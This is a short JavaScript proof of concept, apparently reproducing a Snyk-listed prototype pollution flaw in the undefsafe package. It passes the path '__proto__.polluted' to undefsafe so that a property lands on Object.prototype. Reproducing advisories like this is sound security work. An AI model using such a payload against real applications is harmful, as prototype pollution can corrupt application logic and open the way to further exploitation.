//https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940
  const a = require("undefsafe");
  const obj = {};
  const payload = "__proto__.polluted";
  a({}, payload, "yes");
